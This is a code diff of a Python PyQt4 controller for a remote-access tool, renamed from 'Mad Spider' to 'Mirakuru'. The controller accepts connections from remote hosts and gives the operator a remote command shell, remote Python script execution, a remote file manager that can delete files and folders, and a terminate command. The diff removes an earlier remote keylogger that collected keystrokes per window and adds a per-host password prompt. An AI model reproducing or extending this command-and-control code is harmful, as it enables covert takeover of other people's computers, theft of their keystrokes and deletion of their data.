@@ -7,25 +7,12 @@ import time
 import ast
 import datetime
 import inspect
-import os
-import string
-import random
+import hashlib
 
 from PyQt4.QtGui import *
 from PyQt4.QtCore import *
 
-from libs import linesnum, gui, style, credits, keycodes
-
-
-class ImgWidget(QLabel):
-    def __init__(self, imagepath, parent=None):
-        super(ImgWidget, self).__init__(parent)
-
-        pic = QPixmap(imagepath)
-        out = pic.scaled(QSize(32, 32), Qt.KeepAspectRatio)
-        self.setAlignment(Qt.AlignCenter)
-        self.setStyleSheet(style.fileExplorerImg)
-        self.setPixmap(out)
+from libs import linesnum, gui, style, credits, console
 
 
 class MainDialog(QWidget, gui.Ui_Form):
@@ -35,9 +22,14 @@ class MainDialog(QWidget, gui.Ui_Form):
         self.setupUi(self)
 
         self.statusok('Initializing Py IDLE', self.lineno())
-        # init idle with lines
-        self.lines = linesnum.LineTextWidget()
-        self.editorLayout.addWidget(self.lines)
+        # init idles with lines
+        self.llines = linesnum.LineTextWidget()
+        self.LeditorLayout.addWidget(self.llines)
+        self.rlines = linesnum.LineTextWidget()
+        self.ReditorLayout.addWidget(self.rlines)
+        self.console = console.Console()
+        self.shellLayout.addWidget(self.console)
+
 
         self.statusok('Initializing tray', self.lineno())
         # init tray
@@ -55,12 +47,13 @@ class MainDialog(QWidget, gui.Ui_Form):
         self.port = 0
         self.timeout = 5
         self.gui = QApplication.processEvents
-        self.cursor = QTextCursor(self.consoleText.document())
+        #self.cursor = QTextCursor(self.consoleText.document())
         self.displayText(msg=credits.credit)
 
         self.statusok('Initializing signals', self.lineno())
         # Initializing signals
-        self.commandLine.returnPressed.connect(self.runCommand)
+        #self.commandLine.returnPressed.connect(self.runCommand)
+        #self.console.returnPressed.connect(self.runCommand)
         self.socketsList.itemDoubleClicked.connect(self.connectSocket)
         self.runserverButton.clicked.connect(self.scannerStart)
         self.stopserverButton.clicked.connect(self.scannerStop)
@@ -72,12 +65,10 @@ class MainDialog(QWidget, gui.Ui_Form):
         self.removeexplorerButton.clicked.connect(self.deleteContent)
         self.explorerPathEntry.returnPressed.connect(self.openPath)
         self.executeButton.clicked.connect(self.executeScript)
-        self.clearoutputButton.clicked.connect(self.clearOutput)
-        self.startloggingButton.clicked.connect(self.Keylogging)
-        self.stoploggingButton.clicked.connect(self.Stoplogging)
         self.connect(self, SIGNAL('triggered()'), self.closeEvent)
 
         self.connect(self.tabWidget, SIGNAL('currentChanged(int)'), self.tabDetector)
+        self.connect(self.console, SIGNAL("returnPressed"), self.runCommand)
 
         # Initializing combobox change Event
         self.connect(self.explorerDrivesDrop, SIGNAL('currentIndexChanged(int)'), self.driveChange)
@@ -86,7 +77,7 @@ class MainDialog(QWidget, gui.Ui_Form):
 
         self.statusok('Set placeholder text for command line', self.lineno())
         # Set placeholder text for command line
-        self.commandLine.setPlaceholderText('type command here...')
+        #self.commandLine.setPlaceholderText('type command here...')
 
         self.statusok('Initializing explorers custom menu', self.lineno())
         # Initializing explorer right click menu
@@ -98,21 +89,7 @@ class MainDialog(QWidget, gui.Ui_Form):
         # Finish initializing
         self.statusok('Initialized', self.lineno())
 
-        self.tabsDisable(True)
-
-    # START: TabWidget functions
-
-    # Disable & Enable tabs
-    def tabsDisable(self, state):
-
-        # If state == True disable tabs and change to first tab
-        if state:
-            self.tabWidget.setDisabled(state)
-            self.tabWidget.setCurrentIndex(0)
-
-        # if state == False enable tabs
-        else:
-            self.tabWidget.setDisabled(state)
+        self.tabWidget.setEnabled(False)
 
     # Detect tabs switch
     def tabDetector(self):
@@ -122,104 +99,6 @@ class MainDialog(QWidget, gui.Ui_Form):
             self.explorerGetlist()
 
     # END: TabWidget functions
-
-
-    # START: Keylogger
-
-    def Keylogging(self):
-
-        self.KeyLoggingState = True
-        self.KeyStokes = {}
-        self.BObjects = {}
-        self.activeWindowTitle = None
-
-        self.Send('StartLogging')
-        self.Receive()
-
-        def Code_filter(key):
-            if keycodes.keycodes.has_key(key):
-                return keycodes.keycodes[key]
-            else:
-                return chr(int(key))
-
-
-        while self.KeyLoggingState:
-            time.sleep(0.1)
-            self.gui()
-            self.Send('GiveMeKeyStokes')
-            data = ast.literal_eval(self.Receive().split('\n')[-1])
-            for title, key in data.iteritems():
-                for char in key.split(' '):
-                    if self.KeyStokes.has_key(title):
-                        self.KeyStokes[title] += Code_filter(char)
-                    else:
-                         self.KeyStokes[title] = Code_filter(char)
-                for key, val in self.BObjects.iteritems():
-                    button = self.findChild(QPushButton, key)
-                    button.setStyleSheet(self.Styles(key, False))
-                    if val == title:
-                        button = self.findChild(QPushButton, key)
-                        button.setStyleSheet(self.Styles(key, True))
-
-            self.UpdateKeyloggerGUI()
-
-    def Styles(self, ObjName, active=False):
-        return '''
-            QPushButton#%s {
-            background: #194759;
-            color: #fafafa;
-            font-size: 14px;
-            border: solid #00bbff 2px;
-            border-radius: none;
-            text-decoration: none;
-            background-color: qlineargradient(spread:pad, x1:1, y1:1, x2:0, y2:0, stop:0 %s, stop:1 %s);
-            }
-            QPushButton#%s:hover {
-            background: #1f5a70;
-            background-color: qlineargradient(spread:pad, x1:1, y1:1, x2:0, y2:0, stop:0 %s, stop:1 %s);
-            }
-            ''' % (ObjName, '#194759' if not active else '#3e7015', '#1f5a70' if not active else '#50911b',
-                   ObjName, '#194759' if not active else '#3e7015', '#1f5a70' if not active else '#50911b')
-
-    def UpdateKeyloggerGUI(self):
-
-        def FindObjByName(ObjName):
-            self.activeWindowTitle = ObjName
-
-        def GenerateName(size=10, chars=string.ascii_uppercase):
-            return ''.join(random.choice(chars) for _ in range(size))
-
-        def CreateButton(ObjName, Text):
-            self.BObjects[ObjName] = Text
-            if len(Text) > 20:
-                self.TempButton = QPushButton(Text[:17]+'...', self)
-            else:
-                self.TempButton = QPushButton(Text, self)
-            self.TempButton.setObjectName(ObjName)
-            self.TempButton.setMinimumSize(QSize(200, 20))
-            self.TempButton.setMaximumSize(QSize(200, 20))
-            self.TempButton.setStyleSheet(self.Styles(ObjName, False))
-
-            self.connect(self.TempButton, SIGNAL('clicked()'), lambda: FindObjByName(ObjName))
-            self.windowsnamesLayout.addWidget(self.TempButton)
-            self.windowsnamesLayout.setAlignment(Qt.AlignTop)
-
-        for title, keystokes in self.KeyStokes.iteritems():
-            if title not in self.BObjects.values():
-                ObjName = GenerateName()
-                CreateButton(ObjName, title)
-
-        if self.activeWindowTitle:
-            print self.KeyStokes[self.BObjects[self.activeWindowTitle]]
-            self.keystokesText.setText('<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">%s</font></p><br>'
-                                       % self.BObjects[self.activeWindowTitle] + self.KeyStokes[self.BObjects[self.activeWindowTitle]])
-
-    def Stoplogging(self):
-        self.KeyLoggingState = False
-        self.Send('StopLogging')
-        print self.Receive()
-
-    # END: Keylogger
     
     # START: socket functions
     # listen for clients
@@ -247,11 +126,14 @@ class MainDialog(QWidget, gui.Ui_Form):
         # Buttons
         if not self.stopserverButton.isChecked():
             self.stopserverButton.setChecked(True)
-            self.tabsDisable(True)
+            self.tabWidget.setEnabled(False)
+            self.tabWidget.setCurrentIndex(0)
         else:
 
             # Close all connection and terminate socket
             self.acceptthreadState = False
+
+            # Make Last connection for terminate thread
             try:
                 self.shd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.shd.connect(('127.0.0.1', self.port))
@@ -259,7 +141,6 @@ class MainDialog(QWidget, gui.Ui_Form):
             except:
                 pass
             if self.active:
-                self.socks[self.sockind].close()
                 self.active = False
                 self.c.close()
 
@@ -269,9 +150,10 @@ class MainDialog(QWidget, gui.Ui_Form):
             self.stopserverButton.setChecked(True)
             self.socketsList.clear()
             self.displayText(msg=credits.credit)
-            self.setWindowTitle('Mad Spider - Client')
+            self.setWindowTitle('Mirakuru - Client')
             #self.stopServer()
-            self.tabsDisable(True)
+            self.tabWidget.setEnabled(False)
+            self.tabWidget.setCurrentIndex(0)
 
 
     # make new variables, clear all text
@@ -281,9 +163,10 @@ class MainDialog(QWidget, gui.Ui_Form):
         # Initializing variables
         self.socks = []
         self.sockItems = []
+        self.unlockedSocks = []
         self.counter = 0
         self.socketsList.clear()
-        self.commandLine.setText('')
+        #self.commandLine.setText('')
         self.acceptthreadState = True
         self.statusok('Initializing new thread for listen connections', self.lineno())
         # Initializing new thread for listen connections
@@ -296,78 +179,107 @@ class MainDialog(QWidget, gui.Ui_Form):
     # accept connections
     # add to socketlist widget
     def listenConnections(self, port):
-        #self.statusok('Initializing socket', self.lineno())
+
         # Initializing socket
         self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # telling the OS that you know what you're doing and you still want to bind to the same port
         self.c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        #self.statusok('Bind address >> {}:{}'.format(self.server, port), self.lineno())
+
         # Bind address
         self.c.bind((self.server, int(port)))
-        #self.statusok('Start listen for connections', self.lineno())
+
         # Start listen for connections
         self.c.listen(128)
         while self.acceptthreadState == True:
             try:
-                #self.statusok('Try accept connection', self.lineno())
+
                 # Try accept connection
                 self.s, self.a = self.c.accept()
             except:
-                #self.statusno('No connection detected', self.lineno())
+
                 continue
 
             if self.acceptthreadState == False:
-                #self.statusno('Stoped listening for connections', self.lineno())
                 return
             if self.s:
 
-                #self.statusok('Set timeout None', self.lineno())
                 # Set timeout None
                 self.s.settimeout(self.timeout)
 
-                #self.statusok('Save connected socket', self.lineno())
                 # Save connected socket
                 self.socks += [self.s]
 
-                #self.statusok('Save connected address', self.lineno())
                 # Save connected address
                 self.sockItems += [self.a]
-                self.counter += 1
 
-                #self.statusok('Add connection to servers list', self.lineno())
+                self.trayIcon.showMessage('New Connection', 'From {}'.format(self.a[0]), self.lineno())
+
                 # Add connection to servers list
-                itm = QListWidgetItem('[-%s-]  %s' % (str(self.counter), self.a[0]))
-                itm.setIcon(QIcon(r'assets/tick.png'))
-                self.socketsList.addItem(itm)
-                self.clientscountLabel.setText(str(self.socketsList.count()))
-                self.statusok('New connection from {}'.format(str(self.sockItems[self.sockind])), self.lineno())
-                self.trayIcon.showMessage('New Connection', 'From {}'.format(str(self.sockItems[self.sockind])), self.lineno())
+                self.socketListUpdate()
+
+
+    def socketListUpdate(self):
+        self.socketsList.clear()
+        for __sock__ in self.sockItems:
+            row = QListWidgetItem(' %s ' % __sock__[0])
+            if __sock__ in self.unlockedSocks:
+                row.setIcon(QIcon(r'assets/unlocked.png'))
+            else:
+                row.setIcon(QIcon(r'assets/tick.png'))
+            self.socketsList.addItem(row)
+            self.clientscountLabel.setText(str(self.socketsList.count()))
 
     # connect to client
     def connectSocket(self):
-        try:
-            self.sockind = int(self.socketsList.currentItem().text().split('-')[1]) - 1
-        except:
-            self.msg(text='Not connected', title='Error')
-            return
-        self.displayText(header='Connecting to %s' % str(self.sockItems[self.sockind]))
-        try:
-            self.active = True
 
-            self.statusok('Send Activate message', self.lineno())
-            # Send activate message to target
-            self.Send('Activate')
+        # Update server index
+        try:
+            self.sockind = self.socketsList.currentRow()
+        except:
+            return
+
+        self.active = True
+
+        # Ask Password
+        while 1:
+            if self.sockItems[self.sockind] not in self.unlockedSocks:
+                dlg = QInputDialog(self)
+                dlg.setInputMode(QInputDialog.TextInput)
+                dlg.setWindowTitle('Password Protection')
+                dlg.setLabelText('Enter Password: ')
+                dlg.setOkButtonText('Login')
+                dlg.setStyleSheet(style.popupDialog)
+                ok = dlg.exec_()
+
+                if str(dlg.textValue()) != '':
+                    _hash = hashlib.md5()
+                    _hash.update(str(dlg.textValue()))
+                    self.Send(_hash.hexdigest())
+                else:
+                    break
+
+            else:
+                self.Send('areyouactive')
 
             try:
-                self.statusok('Recieve activate message from target', self.lineno())
-                # Recieve activate message from target
                 self.data = self.Receive()
 
                 if self.data != '':
-                    self.displayText(msg=self.data.split('XORXORXOR13')[0])
-                    self.setWindowTitle('Mad Spider - Client - Connected to %s' % str(self.sockItems[self.sockind]))
-                    self.statusok('Connected to {}'.format(str(self.sockItems[self.sockind])), self.lineno())
-                    self.tabsDisable(False)
+                    if self.data == 'Access Denied':
+                        self.displayText(msg='<br><br><p align="center">'
+                                             '<table style="border-color: #CC2E2E; border-style: solid;" border="1" width="300" cellpadding="5">'
+                                             '<tr><td><font size=42 color=#CC2E2E><p align="center">'
+                                             'ACCESS DENIED'
+                                             '</p></font></td></tr></table></p>')
+                        continue
+                    else:
+                        self.active = True
+                        self.console.showMessage(message='')
+                        self.setWindowTitle('Mirakuru - Client - Connected to %s' % str(self.sockItems[self.sockind]))
+                        self.tabWidget.setEnabled(True)
+                        self.unlockedSocks.append(self.sockItems[self.sockind])
+                        self.socketListUpdate()
+                        break
             except socket.error:
                 self.statusno('Error while recieve message from target', self.lineno())
                 self.statusok('Close connection', self.lineno())
@@ -375,15 +287,26 @@ class MainDialog(QWidget, gui.Ui_Form):
                 self.socks[self.sockind].close()
                 time.sleep(0.8)
                 self.active = False
+                break
+            break
 
-        except socket.error:
-            time.sleep(0.8)
-            self.active = False
+    def terminateSock(self):
+        self.Send('terminate')
+        data = self.Receive()
+        if data == 'quitted':
+            self.socks[self.sockind].close()
+            self.displayText(msg='<br><br><p align="center"><font size=42 color=#CC2E2E>%s<br>Connection Lost</font></p>' % self.sockItems[self.sockind][0])
+            del self.socks[self.sockind]
+            del self.sockItems[self.sockind]
+            self.socketListUpdate()
+            self.tabWidget.setEnabled(False)
+            self.tabWidget.setCurrentIndex(0)
 
     # while close program, connect himself for shutdown socket
     def closeEvent(self, event):
         if self.acceptthreadState:
             self.acceptthreadState = False
+            self.KeyLoggingState = False
 
             self.statusok('Initializing shutdown signal socket', self.lineno())
             # Initializing shutdown signal socket
@@ -431,7 +354,8 @@ class MainDialog(QWidget, gui.Ui_Form):
                     self.gui()
                     l = self.socks[self.sockind].recv(1024)
         except socket.timeout:
-            self.tabsDisable(True)
+            self.tabWidget.setEnabled(False)
+            self.tabWidget.setCurrentIndex(0)
             self.displayText()
             self.statusno('Connection lost with ' + self.sockItems[self.sockind][0], self.lineno())
             return 'ConnectionError'
@@ -446,7 +370,7 @@ class MainDialog(QWidget, gui.Ui_Form):
 
         self.statusok('Send script to remote host', self.lineno())
         # Send script to remote host for execute
-        self.Send('runscript ' + str(self.lines.getTextEdit()))
+        self.Send('runscript ' + str(self.llines.getTextEdit()))
 
         self.statusok('Recieve executed scripts output', self.lineno())
         # Recieve executed scripts output
@@ -454,33 +378,20 @@ class MainDialog(QWidget, gui.Ui_Form):
 
         self.statusok('Update output', self.lineno())
         # Update output console
-        self.outputConsole.setHtml(data.split('</p>')[-1])
-
-
-    # clear output from executed script
-    def clearOutput(self):
-        self.statusok('Clear IDLE output', self.lineno())
-        # clear output
-        self.outputConsole.clear()
+        #self.outputConsole.setHtml(data.split('</p>')[-1])
         
     # END: remote scripting functions
 
     # START: explorer functions
     # get list of content from remote folder
     def explorerGetlist(self):
-        def img(bool, ext):
-            if os.path.exists(os.path.join('assets', 'extensions', ext + '.png')):
-                return os.path.join('assets', 'extensions', ext + '.png')
-            if bool:
-                return os.path.join('assets', 'extensions', '_blank.png')
-            else:
-                return os.path.join('assets', 'extensions', 'folder.png')
 
-        def type(bool):
-            if bool:
-                return 'File'
-            else:
-                return 'Folder'
+        def sizeof_fmt(num, suffix='B'):
+            for unit in ['','K','M','G','T','P','E','Z']:
+                if abs(num) < 1024.0:
+                    return "%3.1f%s%s" % (num, unit, suffix)
+                num /= 1024.0
+            return "%.1f%s%s" % (num, 'Yi', suffix)
 
         # Turn combo signal off
         self.comboInEditMode = True
@@ -528,11 +439,51 @@ class MainDialog(QWidget, gui.Ui_Form):
             except Exception, e:
                 self.statusno('Error while parsing directory', self.lineno())
                 ext = ''
-            self.explorerTable.setCellWidget(n, 0, ImgWidget(img(dic[i]['type'], ext)))
-            item = QTableWidgetItem(type(dic[i]['type']))
-            self.explorerTable.setItem(n, 1, item)
+
+            if dic[i]['hidden']:
+                fileColor = QColor(235, 235, 235)
+                folderColor = QColor(201, 101, 101)
+            else:
+                fileColor = QColor(155, 89, 182)
+                folderColor = QColor(0, 255, 255)
+
+            # set content type
+            item = QTableWidgetItem('File') if dic[i]['type'] else QTableWidgetItem('Folder')
+            if dic[i]['type']:
+                item.setTextColor(fileColor)
+                item.setIcon(QIcon(QPixmap(r'assets\file.png')))
+                item.setSizeHint(QSize(100, 30))
+            else:
+                item.setTextColor(folderColor)
+                item.setIcon(QIcon(QPixmap(r'assets\folder.png')))
+                item.setSizeHint(QSize(100, 30))
+            self.explorerTable.setItem(n, 0, item)
+
+            # set content name
             item = QTableWidgetItem(dic[i]['name'])
+            if dic[i]['type']:
+                item.setTextColor(fileColor)
+            else:
+                item.setTextColor(folderColor)
+            self.explorerTable.setItem(n, 1, item)
+
+            # set content modified date
+            item = QTableWidgetItem(dic[i]['modified'])
+            item.setTextAlignment(Qt.AlignCenter)
+            item.setSizeHint(QSize(220, 30))
             self.explorerTable.setItem(n, 2, item)
+
+            # set file size
+            item = QTableWidgetItem(sizeof_fmt(dic[i]['size'])) if dic[i]['type'] else QTableWidgetItem('')
+            item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
+            item.setTextColor(fileColor)
+            self.explorerTable.setItem(n, 3, item)
+
+        # update table
+        self.explorerTable.resizeColumnsToContents()
+        self.explorerTable.horizontalHeaderItem(3).setTextAlignment(Qt.AlignCenter)
+
+        # count files & directories
         self.explorerContentLabel.setText('Directories: %s Files: %s' % (str(len([i for i in dic if dic[i]['type'] is False])), str(len([i for i in dic if dic[i]['type'] is True]))))
 
     # Change Drive
@@ -563,10 +514,10 @@ class MainDialog(QWidget, gui.Ui_Form):
 
         self.statusok('Get folder name', self.lineno())
         # Get folder name
-        type = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()
-        name = self.explorerTable.item(self.explorerTable.currentItem().row(), 2).text()
+        type = self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text()
+        name = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()
 
-        if type == 'Folder':
+        if 'Folder' in type:
 
             self.statusok('Choose new folder', self.lineno())
             # Choose new folder
@@ -629,10 +580,10 @@ class MainDialog(QWidget, gui.Ui_Form):
             warn.setStyleSheet(style.msgboxStyle)
             ans = warn.exec_()
             if ans == QMessageBox.Yes:
-                if self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text() == 'File':
-                    self.Send('del /Q %s' % self.explorerTable.item(self.explorerTable.currentItem().row(), 2).text())
+                if self.explorerTable.item(self.explorerTable.currentItem().row(), 2).text() == 'File':
+                    self.Send('del /Q %s' % self.explorerTable.item(self.explorerTable.currentItem().row(), 4).text())
                 else:
-                    self.Send('rmdir /S /Q %s' % self.explorerTable.item(self.explorerTable.currentItem().row(), 2).text())
+                    self.Send('rmdir /S /Q %s' % self.explorerTable.item(self.explorerTable.currentItem().row(), 4).text())
                 if self.Receive() == 'ConnectionError':
                     return
             else:
@@ -646,8 +597,8 @@ class MainDialog(QWidget, gui.Ui_Form):
         self.eMenu = QMenu(self)
 
         try:
-            if self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text() == 'Folder':
-                self.eMenu.addAction(QIcon('assets\\extensions\\folder.png'), 'Open folder', self.openFolder)
+            if self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text() == 'Folder':
+                self.eMenu.addAction(QIcon('assets\\folder.png'), 'Open folder', self.openFolder)
                 self.eMenu.addSeparator()
         except:
             pass
@@ -676,10 +627,10 @@ class MainDialog(QWidget, gui.Ui_Form):
     # START: shell functions
     # display console text
     def displayText(self, msg='', header='', error=''):
-        self.consoleText.setHtml('''
-        <p align="center" style="color: #ffffff; background-color: #7d0e0e">%s</p>
-        <p align="center" style="color: #ffffff; background-color: green">%s</p>
-        <p align="left" style="color: #ffffff;">%s</p>
+        self.console.setHtml('''
+        <p align="center" style="color: #ffffff; background-color: #CC2E2E">%s</p>
+        <p align="center" style="color: #2ecc71; background-color: #194759">%s</p>
+        <p align="center" style="color: #ffffff;">%s</p>
         ''' % (error, header, msg.replace('\n', '<br>').replace('\t', '   ')))
 
     # run shell command
@@ -687,19 +638,15 @@ class MainDialog(QWidget, gui.Ui_Form):
         if self.active:
             try:
 
-                # TEMP:
-                if self.commandLine.text() == 'StartLogging':
-                    self.Keylogging()
-                if self.commandLine.text() == 'GiveStokes':
-                    self.CaptureKeyStokes()
+                command = self.console.command
+                self.Send(command)
+                data = self.Receive().split('>')[-1]
+                while data.startswith('\n'):
+                    data = data[1:]
+                data = data.replace('\n', '<br>')
 
-                self.statusok('Send shell command', self.lineno())
-                # Send cmd command
-                self.Send(unicode(self.commandLine.text()))
-
-                self.statusok('Recieve answer for shell command', self.lineno())
-                # Recieve answer to shell command
-                self.data = self.Receive()
+                self.console.append('<font color=#3CFFFF>'+data+'</font>')
+                self.console.newPrompt()
 
             except socket.error:
 
@@ -709,15 +656,7 @@ class MainDialog(QWidget, gui.Ui_Form):
 
                 time.sleep(0.8)
                 self.active = False
-            if self.data != '':
 
-                self.statusok('Set status output', self.lineno())
-                # Set shell output
-                self.displayText(header=self.commandLine.text(), msg=self.data.split('XORXORXOR13')[0])
-                self.commandLine.setText('')
-        else:
-            self.displayText(msg='run server and click to client for connect', error='Not connected')
-            self.commandLine.setText('')
     
     # END: shell functions
 
@@ -731,9 +670,8 @@ class MainDialog(QWidget, gui.Ui_Form):
         self.sMenu.addAction(QIcon('assets\\terminal.png'), 'Remote CMD', self.remoteCMD)
         self.sMenu.addAction(QIcon('assets\\python.png'), 'Remote Python', self.remotePython)
         self.sMenu.addAction(QIcon('assets\\file_manager.png'), 'Remote File Manager', self.remoteExplorer)
-        self.sMenu.addAction(QIcon('assets\\keylogger.png'), 'Remote Keylogger', self.remoteKeylogger)
         self.sMenu.addSeparator()
-        self.sMenu.addAction(QIcon('assets\\stop.png'), 'Terminate', self.createFolder)
+        self.sMenu.addAction(QIcon('assets\\stop.png'), 'Terminate', self.terminateSock)
 
 
         # Check if server selected
@@ -755,10 +693,6 @@ class MainDialog(QWidget, gui.Ui_Form):
     # Switch to File Manager tab
     def remoteExplorer(self):
         self.tabWidget.setCurrentIndex(2)
-
-    # Switch to Keylogger tab
-    def remoteKeylogger(self):
-    	self.tabWidget.setCurrentIndex(3)
     
     # START: messages functions
     # popup message
@@ -779,14 +713,14 @@ class MainDialog(QWidget, gui.Ui_Form):
     def statusok(self, msg, line):
         self.statusConsoleText.moveCursor(QTextCursor.End)
         self.statusConsoleText.insertHtml(
-            '<br><font color="green">[+]</font> <font color=white>(%s)</font> <font color="green">[CODE:%s]</font> - <font color=white>%s</font>' % (
+            '<br>[+] (%s) [CODE:%s] - <font color=#f07e01>%s</font>' % (
                 datetime.datetime.now(), line, msg))
 
     # display status with error message
     def statusno(self, msg, line):
         self.statusConsoleText.moveCursor(QTextCursor.End)
         self.statusConsoleText.append(
-            '<br><font color="red">[-]</font> <font color=white>(%s)</font> <font color="red">[CODE:%s]</font> - <font color=white>%s</font>' % (
+            '<br><font color="red">[-]</font> (%s) <font color="red">[CODE:%s]</font> - <font color=#f07e01>%s</font>' % (
                 datetime.datetime.now(), line, msg))
         
     # END: messages function
@@ -804,7 +738,7 @@ class SystemTrayIcon(QSystemTrayIcon, MainDialog):
         self.trExit.triggered.connect(self._exit)
 
     def welcome(self):
-        self.showMessage('Welcome', 'Welcome to Mad Spider\n2.02 beta', QSystemTrayIcon.Information)
+        self.showMessage('Welcome', 'Mirakuru\n1.0', QSystemTrayIcon.Information)
 
     def show(self):
         QSystemTrayIcon.show(self)
